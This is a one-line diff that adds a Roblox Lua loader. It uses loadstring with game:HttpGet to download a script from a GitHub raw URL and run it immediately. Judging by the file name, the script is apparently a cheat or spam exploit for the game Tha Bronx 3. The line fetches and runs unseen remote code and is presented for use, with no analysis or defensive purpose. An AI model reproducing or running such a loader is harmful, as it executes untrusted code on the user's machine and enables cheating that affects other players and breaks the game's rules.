@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/tha-bronx-3-spam2-zmas2l0io1o2w1.lua"))()
